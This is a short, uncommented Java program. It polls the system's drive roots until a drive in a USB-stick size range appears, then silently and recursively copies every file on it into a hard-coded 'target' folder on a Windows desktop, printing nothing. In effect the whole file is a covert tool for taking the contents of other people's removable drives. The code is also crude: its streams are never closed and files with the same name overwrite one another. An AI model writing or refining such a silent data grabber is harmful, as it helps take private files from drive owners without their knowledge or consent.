import java.io.*;
class project
{
void dir(File ob) throws Exception
{
File [] f2=ob.listFiles();
if(f2.length==0)
{System.out.print("");}
else
{
for(int i=0;i<f2.length;i++)
{
if(f2[i].isDirectory()==true)
{
ob=f2[i];
dir(ob);
}
else
{
FileInputStream fis=new FileInputStream(f2[i]);
String lc="C:\\Users\\S\\Desktop\\target\\"+f2[i].getName();
File sk=new File(lc);
sk.createNewFile();
FileOutputStream fos=new FileOutputStream(sk);
int a=fis.read();
while(a!=-1)
{
fos.write(a);
a=fis.read();
}
}
}
}
}
public static void main(String...arg) throws Exception
{
int k=0,flag=0;
while(flag!=1)
{
project pr=new project();
File [] f1=File.listRoots();
for(int i=0;i<f1.length;i++)
{
long l=100000,u=3300000;
if((f1[i].getTotalSpace()/10000)>l&&(f1[i].getTotalSpace()/10000)<=u)
{
flag=1;
k=i;
break;
}
}

if(flag==1)
{
pr.dir(f1[k]);
}
else
{System.out.print("");}
}
}
}